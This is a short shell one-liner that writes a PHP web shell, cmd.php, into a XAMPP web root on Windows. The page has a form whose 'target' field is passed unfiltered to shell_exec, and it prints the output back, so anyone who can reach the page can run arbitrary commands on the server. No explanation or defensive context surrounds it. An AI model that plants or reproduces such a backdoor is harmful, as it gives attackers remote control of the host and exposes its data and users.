echo "<html lang='en'>

<head></head>
<body>

<p>Enter command:  
            <form method='get' action=''>
                <div class='form-group'> 
                    <label></label>
                    <input class='form-control' width='50%' placeholder='' name='target'></input> <br>
                    <div align='left'> <button class='btn btn-default' type='submit'>Submit Button</button></div>
               </div> 
            </form>
</p>

<?php
    if (isset($_REQUEST['target'])) 
	{
		$target = $_REQUEST['target']; 
		 $cmd = shell_exec( $target );
		echo '<pre>'.$cmd.'</pre>';
            
        
    }
                
?>
			
</body>

</html>" > C:\xampp\htdocs\cmd.php
